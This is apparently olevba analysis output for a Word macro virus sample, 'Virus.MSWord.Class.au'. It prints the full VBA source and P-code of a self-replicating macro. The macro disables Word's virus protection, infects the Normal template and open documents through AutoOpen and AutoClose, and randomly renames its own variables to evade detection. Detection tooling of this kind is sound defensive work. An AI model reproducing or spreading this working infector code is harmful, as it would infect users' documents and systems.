olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.au
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.au - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
RB6148 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
BP972 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set BU9259 = ActiveDocument.VBProject.VBComponents.Item(1)
SJ6829 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set BU9259 = NormalTemplate.VBProject.VBComponents.Item(1)
IM6776 = True
Call CR883_LA1713
End If
If IM6776 <> True And SJ6829 <> True Then GoTo TF912
If IM6776 = True Then BU9259.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RB6148 - 1))
If SJ6829 = True Then BU9259.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BP972 - 1))
TF912:
If BP972 <> 0 And RB6148 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub CR883_LA1713()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "JR2967": r1(2) = "MQ9072": r1(3) = "AS4663": r1(4) = "PQ1863": r1(5) = "LA1713": r1(6) = "RB6148"
r1(7) = "BP972": r1(8) = "SJ6829":: r1(9) = "BU9259": r1(10) = "IM6776": r1(11) = "TF912": r1(12) = "CR883": r1(13) = "FV931": r1(14) = "KK2211"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call LA1713(a1, r1(x))
Next x
End Sub
Private Sub LA1713(KK2211, FV931 As String)  'v1.0
On Error Resume Next
Dim JR2967 As Long: Dim MQ9072 As Long: Dim AS4663 As Long: Dim PQ1863 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
JR2967 = 1: MQ9072 = 1: AS4663 = .CountOfLines: PQ1863 = Len(.Lines(.CountOfLines, 1))
Do While .Find(FV931, JR2967, MQ9072, AS4663, PQ1863, True)
strline = .Lines(JR2967, 1)
strline = Left(strline, MQ9072 - 1) & KK2211 & Mid(strline, PQ1863)
.replaceline JR2967, strline
JR2967 = AS4663 + 1: MQ9072 = 1: DD2134 = .CountOfLines
PQ1863 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.au
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14448 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St RB6148 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St BP972 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set BU9259 
' Line #9:
' 	LitVarSpecial (True)
' 	St SJ6829 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set BU9259 
' Line #13:
' 	LitVarSpecial (True)
' 	St IM6776 
' Line #14:
' 	ArgsCall (Call) CR883_LA1713 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld IM6776 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld SJ6829 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo TF912 
' 	EndIf 
' Line #17:
' 	Ld IM6776 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld RB6148 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld BU9259 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #18:
' 	Ld SJ6829 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld BP972 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld BU9259 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #19:
' 	Label TF912 
' Line #20:
' 	Ld BP972 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld RB6148 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Sub CR883_LA1713())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall Read 0x0000 
' Line #25:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn r1 (As String)
' Line #26:
' 	LitStr 0x0006 "JR2967"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "MQ9072"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AS4663"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "PQ1863"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "LA1713"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RB6148"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #27:
' 	LitStr 0x0005 "BP972"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "SJ6829"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0006 "BU9259"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IM6776"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "TF912"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "CR883"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "FV931"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KK2211"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #29:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #30:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) LA1713 0x0002 
' Line #31:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Private Sub LA1713(KK2211, FV931 As String))
' 	QuoteRem 0x002D 0x0004 "v1.0"
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Dim 
' 	VarDefn JR2967 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn MQ9072 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn AS4663 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn PQ1863 (As Long)
' Line #36:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #37:
' 	LitDI2 0x0001 
' 	St JR2967 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St MQ9072 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St AS4663 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St PQ1863 
' Line #38:
' 	Ld FV931 
' 	Ld JR2967 
' 	Ld MQ9072 
' 	Ld AS4663 
' 	Ld PQ1863 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #39:
' 	Ld JR2967 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #40:
' 	Ld strline 
' 	Ld MQ9072 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld KK2211 
' 	Concat 
' 	Ld strline 
' 	Ld PQ1863 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #41:
' 	Ld JR2967 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #42:
' 	Ld AS4663 
' 	LitDI2 0x0001 
' 	Add 
' 	St JR2967 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St MQ9072 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St DD2134 
' Line #43:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St PQ1863 
' Line #44:
' 	Loop 
' Line #45:
' 	EndWith 
' Line #46:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

